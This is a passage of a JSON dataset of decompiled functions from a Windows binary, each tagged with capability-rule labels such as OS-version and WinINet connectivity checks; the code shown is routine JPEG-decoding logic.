        "decompiled_code": "\nint32_t __cdecl fcn.00433b24(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = in_ECX + arg_ch;\n    if (((in_EDX[1] <= uVar3 && uVar3 != in_EDX[1]) || (in_EDX[3] <= arg_ch && arg_ch != in_EDX[3])) || (*in_EDX == 0))\n    {\n        *(*in_EAX + 0x14) = 0x16;\n        (***in_EAX)();\n    }\n    if ((in_ECX < in_EDX[6]) || (in_EDX[6] + in_EDX[4] < uVar3)) {\n        if (in_EDX[10] == 0) {\n            *(*in_EAX + 0x14) = 0x45;\n            (***in_EAX)();\n        }\n        if (in_EDX[9] != 0) {\n            fcn.00433930();\n            in_EDX[9] = 0;\n        }\n        if (in_ECX < in_EDX[6] || in_ECX == in_EDX[6]) {\n            iVar1 = uVar3 - in_EDX[4];\n            if (iVar1 < 0) {\n                iVar1 = 0;\n            }\n            in_EDX[6] = iVar1;\n        }\n        else {\n            in_EDX[6] = in_ECX;\n        }\n        fcn.00433930();\n    }\n    if (in_EDX[7] < uVar3) {\n        if (in_EDX[7] < in_ECX) {\n            uVar2 = in_ECX;\n            if (arg_8h != 0) {\n                *(*in_EAX + 0x14) = 0x16;\n                (***in_EAX)();\n            }\n        }\n        else {\n            uVar2 = in_EDX[7];\n        }\n        if (arg_8h != 0) {\n            in_EDX[7] = uVar3;\n        }\n        if (in_EDX[8] == 0) {\n            if (arg_8h == 0) {\n                *(*in_EAX + 0x14) = 0x16;\n                (***in_EAX)();\n            }\n        }\n        else {\n            iVar1 = in_EDX[6];\n            for (uVar2 = uVar2 - iVar1; uVar2 < uVar3 - iVar1; uVar2 = uVar2 + 1) {\n                fcn.0043e53c();\n            }\n        }\n    }\n    if (arg_8h != 0) {\n        in_EDX[9] = 1;\n    }\n    return (in_ECX - in_EDX[6]) * 4 + *in_EDX;\n}\n",
        "token_count": 687
    },
    "00433c6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433c6c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *in_EAX;\n    \n    iVar1 = in_EAX[1];\n    if ((param_2 < 0) || (1 < param_2)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xe;\n        *(iVar2 + 0x18) = param_2;\n        (***in_EAX)();\n    }\n    if (param_2 == 1) {\n        for (iVar2 = *(iVar1 + 0x44); iVar2 != 0; iVar2 = *(iVar2 + 0x2c)) {\n            if (*(iVar2 + 0x28) != 0) {\n                *(iVar2 + 0x28) = 0;\n                (**(iVar2 + 0x38))();\n            }\n        }\n        *(iVar1 + 0x44) = 0;\n        for (iVar2 = *(iVar1 + 0x48); iVar2 != 0; iVar2 = *(iVar2 + 0x2c)) {\n            if (*(iVar2 + 0x28) != 0) {\n                *(iVar2 + 0x28) = 0;\n                (**(iVar2 + 0x38))();\n            }\n        }\n        *(iVar1 + 0x48) = 0;\n    }\n    puVar3 = *(iVar1 + 0x3c + param_2 * 4);\n    *(iVar1 + 0x3c + param_2 * 4) = 0;\n    while (puVar3 != NULL) {\n        iVar2 = puVar3[1];\n        puVar4 = *puVar3;\n        iVar5 = puVar3[2];\n        fcn.00433ebc();\n        *(iVar1 + 0x4c) = *(iVar1 + 0x4c) - (iVar2 + iVar5 + 0xc);\n        puVar3 = puVar4;\n    }\n    puVar3 = *(iVar1 + 0x34 + param_2 * 4);\n    *(iVar1 + 0x34 + param_2 * 4) = 0;\n    while (puVar3 != NULL) {\n        iVar2 = puVar3[1];\n        puVar4 = *puVar3;\n        iVar5 = puVar3[2];\n        fcn.00433eac();\n        *(iVar1 + 0x4c) = *(iVar1 + 0x4c) - (iVar2 + iVar5 + 0xc);\n        puVar3 = puVar4;\n    }\n    return;\n}\n",
        "token_count": 628
    },
    "00433ee8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00433ee8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if ((0xffdc < in_EAX[8]) || (0xffdc < in_EAX[7])) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x29;\n        *(iVar3 + 0x18) = 0xffdc;\n        (***in_EAX)();\n    }\n    if (in_EAX[0x35] != 8) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0xf;\n        *(iVar3 + 0x18) = in_EAX[0x35];\n        (***in_EAX)();\n    }\n    if (10 < in_EAX[9]) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x1a;\n        *(iVar3 + 0x18) = in_EAX[9];\n        *(iVar3 + 0x1c) = 10;\n        (***in_EAX)();\n    }\n    in_EAX[0x4d] = 1;\n    in_EAX[0x4e] = 1;\n    iVar3 = in_EAX[0x36];\n    for (iVar4 = 0; iVar4 < in_EAX[9]; iVar4 = iVar4 + 1) {\n        if ((((*(iVar3 + 8) < 1) || (4 < *(iVar3 + 8))) || (*(iVar3 + 0xc) < 1)) || (4 < *(iVar3 + 0xc))) {\n            *(*in_EAX + 0x14) = 0x12;\n            (***in_EAX)();\n        }\n        if (*(iVar3 + 8) < in_EAX[0x4d]) {\n            iVar1 = in_EAX[0x4d];\n        }\n        else {\n            iVar1 = *(iVar3 + 8);\n        }\n        in_EAX[0x4d] = iVar1;\n        if (*(iVar3 + 0xc) < in_EAX[0x4e]) {\n            iVar1 = in_EAX[0x4e];\n        }\n        else {\n            iVar1 = *(iVar3 + 0xc);\n        }\n        in_EAX[0x4e] = iVar1;\n        iVar3 = iVar3 + 0x54;\n    }\n    in_EAX[0x4f] = 8;\n    iVar3 = in_EAX[0x36];\n    for (iVar4 = 0; iVar4 < in_EAX[9]; iVar4 = iVar4 + 1) {\n        *(iVar3 + 0x24) = 8;\n        uVar2 = fcn.0043e4b8();\n        *(iVar3 + 0x1c) = uVar2;\n        uVar2 = fcn.0043e4b8();\n        *(iVar3 + 0x20) = uVar2;\n        uVar2 = fcn.0043e4b8();\n        *(iVar3 + 0x28) = uVar2;\n        uVar2 = fcn.0043e4b8();\n        *(iVar3 + 0x2c) = uVar2;\n        *(iVar3 + 0x30) = 1;\n        *(iVar3 + 0x4c) = 0;\n        iVar3 = iVar3 + 0x54;\n    }\n    iVar3 = fcn.0043e4b8();\n    in_EAX[0x50] = iVar3;\n    if ((in_EAX[0x52] < in_EAX[9]) || (in_EAX[0x37] != 0)) {\n        *(in_EAX[0x6d] + 0x10) = 1;\n    }\n    else {\n        *(in_EAX[0x6d] + 0x10) = 0;\n    }\n    return;\n}\n",
        "token_count": 909
    },
    "0043423c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043423c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    uint arg_8h;\n    int32_t iStack24;\n    int32_t *piStack20;\n    \n    piStack20 = in_EAX + 0x53;\n    for (iStack24 = 0; iStack24 < in_EAX[0x52]; iStack24 = iStack24 + 1) {\n        iVar1 = *piStack20;\n        if (*(iVar1 + 0x4c) == 0) {\n            iVar2 = *(iVar1 + 0x10);\n            if (((iVar2 < 0) || (3 < iVar2)) || (in_EAX[iVar2 + 0x29] == 0)) {\n                iVar3 = *in_EAX;\n                *(iVar3 + 0x14) = 0x34;\n                *(iVar3 + 0x18) = iVar2;\n                (***in_EAX)();\n            }\n            arg_8h = (**in_EAX[1])();\n            fcn.004318c0(arg_8h, in_EAX[iVar2 + 0x29], 0x84);\n            *(iVar1 + 0x4c) = arg_8h;\n        }\n        piStack20 = piStack20 + 1;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "00434458": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00434458(void)\n\n{\n    uint *puVar1;\n    uchar *puVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    \n    puVar1 = in_EAX[6];\n    iVar3 = fcn.004318d4(puVar1[8], 1, 0x1000, puVar1[7]);\n    if (iVar3 == 0) {\n        if (puVar1[9] != 0) {\n            *(*in_EAX + 0x14) = 0x2a;\n            (***in_EAX)();\n        }\n        *(*in_EAX + 0x14) = 0x78;\n        (**(*in_EAX + 4))();\n        puVar2 = puVar1[8];\n        *puVar2 = 0xff;\n        puVar2[1] = 0xd9;\n        iVar3 = 2;\n    }\n    *puVar1 = puVar1[8];\n    puVar1[1] = iVar3;\n    puVar1[9] = 0;\n    return 1;\n}\n",
        "token_count": 248
    },
    "004344f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004344f8(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x18) == 0) {\n        iVar2 = (***(in_EAX + 4))();\n        *(in_EAX + 0x18) = iVar2;\n        uVar3 = (***(in_EAX + 4))();\n        *(iVar2 + 0x20) = uVar3;\n    }\n    puVar1 = *(in_EAX + 0x18);\n    puVar1[2] = 0x43444c;\n    puVar1[3] = fcn.00434458;\n    puVar1[4] = 0x4344c8;\n    puVar1[5] = 0x43e228;\n    puVar1[6] = 0x4344f4;\n    puVar1[7] = param_2;\n    puVar1[1] = 0;\n    *puVar1 = 0;\n    return;\n}\n",
        "token_count": 257
    },
    "00434564": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00434564(void)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (in_EAX[5] == 0xca) {\n        fcn.00435018();\n        if (in_EAX[0x10] != 0) {\n            in_EAX[5] = 0xcf;\n            return 1;\n        }\n        in_EAX[5] = 0xcb;\n    }\n    if (in_EAX[5] == 0xcb) {\n        if (*(in_EAX[0x6d] + 0x10) != 0) {\n            while( true ) {\n                if (in_EAX[2] != 0) {\n                    (**in_EAX[2])();\n                }\n                iVar2 = (**in_EAX[0x6d])();\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                if (iVar2 == 2) break;\n                if ((in_EAX[2] != 0) && ((iVar2 == 3 || (iVar2 == 1)))) {\n                    iVar2 = in_EAX[2];\n                    piVar1 = iVar2 + 4;\n                    *piVar1 = *piVar1 + 1;\n                    if (*(in_EAX[2] + 8) <= *(iVar2 + 4)) {\n                        piVar1 = in_EAX[2] + 8;\n                        *piVar1 = *piVar1 + in_EAX[0x50];\n                    }\n                }\n            }\n        }\n        in_EAX[0x26] = in_EAX[0x24];\n    }\n    else if (in_EAX[5] != 0xcc) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x14;\n        *(iVar2 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    uVar3 = fcn.0043462c();\n    return uVar3;\n}\n",
        "token_count": 462
    },
    "0043462c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043462c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x14) != 0xcc) {\n        (***(in_EAX + 0x1a4))();\n        *(in_EAX + 0x8c) = 0;\n        *(in_EAX + 0x14) = 0xcc;\n    }\n    do {\n        if (*(*(in_EAX + 0x1a4) + 8) == 0) {\n            if (*(in_EAX + 0x44) == 0) {\n                uVar2 = 0xcd;\n            }\n            else {\n                uVar2 = 0xce;\n            }\n            *(in_EAX + 0x14) = uVar2;\n            return 1;\n        }\n        while (*(in_EAX + 0x8c) < *(in_EAX + 0x74)) {\n            iVar1 = *(in_EAX + 8);\n            if (iVar1 != 0) {\n                *(iVar1 + 4) = *(in_EAX + 0x8c);\n                *(iVar1 + 8) = *(in_EAX + 0x74);\n                (***(in_EAX + 8))();\n            }\n            iVar1 = *(in_EAX + 0x8c);\n            (**(*(in_EAX + 0x1a8) + 4))(0);\n            if (iVar1 == *(in_EAX + 0x8c)) {\n                return 0;\n            }\n        }\n        (**(*(in_EAX + 0x1a4) + 4))();\n        (***(in_EAX + 0x1a4))();\n        *(in_EAX + 0x8c) = 0;\n    } while( true );\n}\n",
        "token_count": 411
    },
    "00434828": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434828(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((in_EAX[5] != 0xcf) && (in_EAX[5] != 0xcc)) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\n    }\n    if ((*(in_EAX[0x6d] + 0x14) != 0) && (in_EAX[0x24] < param_2)) {\n        param_2 = in_EAX[0x24];\n    }\n    in_EAX[0x26] = param_2;\n    fcn.0043462c();\n    return;\n}\n",
        "token_count": 221
    },
    "00434888": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00434888(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (((in_EAX[5] == 0xcd) || (in_EAX[5] == 0xce)) && (in_EAX[0x10] != 0)) {\n        (**(in_EAX[0x69] + 4))();\n        in_EAX[5] = 0xd0;\n    }\n    else if (in_EAX[5] != 0xd0) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    while ((in_EAX[0x24] <= in_EAX[0x26] && (*(in_EAX[0x6d] + 0x14) == 0))) {\n        iVar1 = (**in_EAX[0x6d])();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    in_EAX[5] = 0xcf;\n    return 1;\n}\n",
        "token_count": 263
    },
    "00434910": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00434910(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x4c) != 0) || (*(in_EAX + 300) != 0)) {\n        return 0;\n    }\n    if ((*(in_EAX + 0x28) == 3) && (((*(in_EAX + 0x24) == 3 && (*(in_EAX + 0x2c) == 2)) && (*(in_EAX + 0x78) == 3)))) {\n        iVar1 = *(in_EAX + 0xd8);\n        if (((((*(iVar1 + 8) == 2) && (*(iVar1 + 0x5c) == 1)) && (*(iVar1 + 0xb0) == 1)) &&\n            ((*(iVar1 + 0xc) < 3 && (*(iVar1 + 0x60) == 1)))) && (*(iVar1 + 0xb4) == 1)) {\n            iVar1 = *(in_EAX + 0xd8);\n            iVar2 = *(in_EAX + 0x13c);\n            if (((*(iVar1 + 0x24) == iVar2) && (iVar2 == *(iVar1 + 0x78))) && (iVar2 == *(iVar1 + 0xcc))) {\n                return 1;\n            }\n            return 0;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 338
    },
    "004349a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004349a0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (in_EAX[5] != 0xca) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (in_EAX[0xc] << 3 < in_EAX[0xd] || in_EAX[0xc] << 3 == in_EAX[0xd]) {\n        iVar1 = fcn.0043e4b8();\n        in_EAX[0x1c] = iVar1;\n        iVar1 = fcn.0043e4b8();\n        in_EAX[0x1d] = iVar1;\n        in_EAX[0x4f] = 1;\n    }\n    else if (in_EAX[0xc] << 2 < in_EAX[0xd] || in_EAX[0xc] << 2 == in_EAX[0xd]) {\n        iVar1 = fcn.0043e4b8();\n        in_EAX[0x1c] = iVar1;\n        iVar1 = fcn.0043e4b8();\n        in_EAX[0x1d] = iVar1;\n        in_EAX[0x4f] = 2;\n    }\n    else if (in_EAX[0xc] * 2 < in_EAX[0xd] || in_EAX[0xc] * 2 == in_EAX[0xd]) {\n        iVar1 = fcn.0043e4b8();\n        in_EAX[0x1c] = iVar1;\n        iVar1 = fcn.0043e4b8();\n        in_EAX[0x1d] = iVar1;\n        in_EAX[0x4f] = 4;\n    }\n    else {\n        in_EAX[0x1c] = in_EAX[7];\n        in_EAX[0x1d] = in_EAX[8];\n        in_EAX[0x4f] = 8;\n    }\n    iVar1 = in_EAX[0x36];\n    for (iVar4 = 0; iVar4 < in_EAX[9]; iVar4 = iVar4 + 1) {\n        for (iVar2 = in_EAX[0x4f];\n            ((iVar2 < 8 && (*(iVar1 + 8) * iVar2 * 2 <= in_EAX[0x4d] * in_EAX[0x4f])) &&\n            (*(iVar1 + 0xc) * iVar2 * 2 <= in_EAX[0x4e] * in_EAX[0x4f])); iVar2 = iVar2 * 2) {\n        }\n        *(iVar1 + 0x24) = iVar2;\n        iVar1 = iVar1 + 0x54;\n    }\n    iVar1 = in_EAX[0x36];\n    for (iVar4 = 0; iVar4 < in_EAX[9]; iVar4 = iVar4 + 1) {\n        uVar3 = fcn.0043e4b8();\n        *(iVar1 + 0x28) = uVar3;\n        uVar3 = fcn.0043e4b8();\n        *(iVar1 + 0x2c) = uVar3;\n        iVar1 = iVar1 + 0x54;\n    }\n    iVar1 = in_EAX[0xb];\n    if (iVar1 == 1) {\n        in_EAX[0x1e] = 1;\n    }\n    else if (iVar1 - 2U < 2) {\n        in_EAX[0x1e] = 3;\n    }\n    else if (iVar1 - 4U < 2) {\n        in_EAX[0x1e] = 4;\n    }\n    else {\n        in_EAX[0x1e] = in_EAX[9];\n    }\n    if (in_EAX[0x15] == 0) {\n        iVar1 = in_EAX[0x1e];\n    }\n    else {\n        iVar1 = 1;\n    }\n    in_EAX[0x1f] = iVar1;\n    iVar1 = fcn.00434910();\n    if (iVar1 == 0) {\n        in_EAX[0x20] = 1;\n    }\n    else {\n        in_EAX[0x20] = in_EAX[0x4e];\n    }\n    return;\n}\n",
        "token_count": 1038
    },
    "00434c28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00434c4c)\n\nvoid fcn.00434c28(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar1 = in_EAX[0x69];\n    fcn.004349a0();\n    fcn.00434b8c();\n    *(iVar1 + 0xc) = 0;\n    uVar3 = fcn.00434910();\n    *(iVar1 + 0x10) = uVar3;\n    *(iVar1 + 0x14) = 0;\n    *(iVar1 + 0x18) = 0;\n    if ((in_EAX[0x15] == 0) || (in_EAX[0x10] == 0)) {\n        in_EAX[0x19] = 0;\n        in_EAX[0x1a] = 0;\n        in_EAX[0x1b] = 0;\n    }\n    if (in_EAX[0x15] != 0) {\n        if (in_EAX[0x11] != 0) {\n            *(*in_EAX + 0x14) = 0x2f;\n            (***in_EAX)();\n        }\n        if (in_EAX[0x1e] == 3) {\n            if (in_EAX[0x22] == 0) {\n                if (in_EAX[0x17] == 0) {\n                    in_EAX[0x19] = 1;\n                }\n                else {\n                    in_EAX[0x1b] = 1;\n                }\n            }\n            else {\n                in_EAX[0x1a] = 1;\n            }\n        }\n        else {\n            in_EAX[0x19] = 1;\n            in_EAX[0x1a] = 0;\n            in_EAX[0x1b] = 0;\n            in_EAX[0x22] = 0;\n        }\n        if (in_EAX[0x19] != 0) {\n            fcn.0043804c();\n            *(iVar1 + 0x14) = in_EAX[0x73];\n        }\n        if ((in_EAX[0x1b] != 0) || (in_EAX[0x1a] != 0)) {\n            fcn.004392c0();\n            *(iVar1 + 0x18) = in_EAX[0x73];\n        }\n    }\n    if (in_EAX[0x11] == 0) {\n        if (*(iVar1 + 0x10) == 0) {\n            fcn.004372cc();\n            fcn.0043b5f0();\n        }\n        else {\n            fcn.00436e70();\n        }\n        fcn.0043ada8();\n    }\n    fcn.0043b090();\n    if (in_EAX[0x38] == 0) {\n        if (in_EAX[0x37] == 0) {\n            fcn.004368c4();\n        }\n        else {\n            fcn.00435d04();\n        }\n    }\n    else {\n        *(*in_EAX + 0x14) = 1;\n        (***in_EAX)();\n    }\n    fcn.0043aa34();\n    if (in_EAX[0x11] == 0) {\n        fcn.004399d8();\n    }\n    (**(in_EAX[1] + 0x18))();\n    (**(in_EAX[0x6d] + 8))();\n    if (((in_EAX[2] != 0) && (in_EAX[0x10] == 0)) && (*(in_EAX[0x6d] + 0x10) != 0)) {\n        if (in_EAX[0x37] == 0) {\n            iVar4 = in_EAX[9];\n        }\n        else {\n            iVar4 = in_EAX[9] * 3 + 2;\n        }\n        iVar2 = in_EAX[2];\n        *(iVar2 + 4) = 0;\n        *(iVar2 + 8) = in_EAX[0x50] * iVar4;\n        *(iVar2 + 0xc) = 0;\n        if (in_EAX[0x1b] == 0) {\n            uVar3 = 2;\n        }\n        else {\n            uVar3 = 3;\n        }\n        *(in_EAX[2] + 0x10) = uVar3;\n        *(iVar1 + 0xc) = *(iVar1 + 0xc) + 1;\n    }\n    return;\n}\n",
        "token_count": 1056
    },
    "004352a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004352a4(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    iVar2 = *(in_EAX + 0x1bc);\n    iVar3 = *(iVar2 + 0x10);\n    if (iVar3 < 0) {\n        iVar3 = iVar3 + 7;\n    }\n    piVar1 = *(in_EAX + 0x1b8) + 0x18;\n    *piVar1 = *piVar1 + (iVar3 >> 3);\n    *(iVar2 + 0x10) = 0;\n    iVar3 = (**(*(in_EAX + 0x1b8) + 8))();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    puVar4 = iVar2 + 0x18;\n    for (iVar3 = 0; iVar3 < *(in_EAX + 0x148); iVar3 = iVar3 + 1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar2 + 0x14) = 0;\n    *(iVar2 + 0x28) = *(in_EAX + 0x114);\n    if (*(in_EAX + 0x1a0) == 0) {\n        *(iVar2 + 8) = 0;\n    }\n    return 1;\n}\n",
        "token_count": 337
    },
    "00435eb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_53ch\n\nvoid __cdecl fcn.00435eb0(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    char *pcVar4;\n    uint8_t uVar5;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t *piVar6;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    uint var_53ch;\n    uint var_538h;\n    uint var_134h;\n    uint8_t *var_30h;\n    uint8_t *var_2ch;\n    int32_t *var_28h;\n    uint8_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t *var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    if ((in_ECX < 0) || (3 < in_ECX)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x32;\n        *(iVar2 + 0x18) = in_ECX;\n        (***in_EAX)();\n    }\n    if (var_8h == 0) {\n        var_ch = var_4h[in_ECX + 0x31];\n    }\n    else {\n        var_ch = var_4h[in_ECX + 0x2d];\n    }\n    if (var_ch == NULL) {\n        iVar2 = *var_4h;\n        *(iVar2 + 0x14) = 0x32;\n        *(iVar2 + 0x18) = in_ECX;\n        (***var_4h)();\n    }\n    if (*arg_8h == 0) {\n        iVar2 = (**var_4h[1])();\n        *arg_8h = iVar2;\n    }\n    iVar2 = 1;\n    var_10h = *arg_8h;\n    *(*arg_8h + 0x8c) = var_ch;\n    var_14h = 0;\n    puVar7 = var_ch;\n    do {\n        puVar7 = puVar7 + 1;\n        var_18h = *puVar7;\n        if (0x100 < var_14h + var_18h) {\n            *(*var_4h + 0x14) = 8;\n            (***var_4h)();\n        }\n        puVar3 = &var_134h + var_14h;\n        while (uVar1 = var_18h,  var_18h = var_18h - 1,  uVar1 != 0) {\n            *puVar3 = iVar2;\n            var_14h = var_14h + 1;\n            puVar3 = puVar3 + 1;\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x11);\n    iVar2 = 0;\n    *(&var_134h + var_14h) = 0;\n    var_1ch = var_14h;\n    iVar8 = var_134h;\n    var_14h = 0;\n    while (*(&var_134h + var_14h) != '\\0') {\n        piVar6 = &var_538h + var_14h;\n        for (pcVar4 = &var_134h + var_14h; iVar8 == *pcVar4; pcVar4 = pcVar4 + 1) {\n            *piVar6 = iVar2;\n            piVar6 = piVar6 + 1;\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + 1;\n        }\n        if (1 << (iVar8 & 0x1f) <= iVar2) {\n            *(*var_4h + 0x14) = 8;\n            (***var_4h)();\n        }\n        iVar2 = iVar2 * 2;\n        iVar8 = iVar8 + 1;\n    }\n    var_14h = 0;\n    iVar2 = 1;\n    var_20h = var_10h + 0x4c;\n    puVar7 = var_ch;\n    do {\n        puVar7 = puVar7 + 1;\n        if (*puVar7 == 0) {\n            var_20h[-0x12] = -1;\n        }\n        else {\n            *var_20h = var_14h - (&var_538h)[var_14h];\n            var_14h = var_14h + *puVar7;\n            var_20h[-0x12] = (&var_53ch)[var_14h];\n        }\n        var_20h = var_20h + 1;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x11);\n    *(var_10h + 0x44) = 0xfffff;\n    fcn.004318ac(var_10h + 0x90, 0, 0x400);\n    var_14h = 0;\n    iVar2 = 1;\n    var_20h = var_ch;\n    do {\n        var_20h = var_20h + 1;\n        var_30h = var_ch + var_14h + 0x11;\n        var_28h = &var_538h + var_14h;\n        var_24h = var_20h;\n        for (var_18h = 1; var_18h <= *var_20h; var_18h = var_18h + 1) {\n            uVar5 = 8 - iVar2;\n            iVar8 = *var_28h << (uVar5 & 0x1f);\n            var_2ch = var_30h;\n            puVar7 = var_10h + 0x490 + iVar8;\n            piVar6 = var_10h 